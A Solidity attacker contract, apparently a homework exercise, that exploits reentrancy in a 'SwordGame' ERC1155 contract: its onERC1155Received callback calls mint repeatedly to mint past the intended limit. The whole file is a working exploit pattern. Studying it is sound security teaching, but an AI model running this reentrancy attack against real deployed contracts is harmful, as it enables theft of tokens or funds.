// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {SwordGame} from "src/hw/hw1.sol";

contract AttackHW1 {
    SwordGame public swordGame;
    uint256 public tokenId = 1;
    uint256 public nftCount;
    uint16 public maxSupply = 10;

    constructor(SwordGame _swordGame) {
        swordGame = _swordGame;
    }

    receive() external payable {}

    function attack() public payable {
        swordGame.mint{value: 1 ether}(tokenId);
        swordGame.safeTransferFrom(address(this), msg.sender, tokenId, 10, "");
    }

    function onERC1155Received(
        address, // operator
        address, // from
        uint256, // id
        uint256 amount, // amount
        bytes calldata // data
    ) external returns (bytes4) {
        nftCount += amount;

        // 循环调用 mint 函数
        while (nftCount < maxSupply) {
            try swordGame.mint{value: 1 ether}(tokenId) {
                nftCount++;
            } catch {
                break;
            }
        }

        return this.onERC1155Received.selector;
    }
}
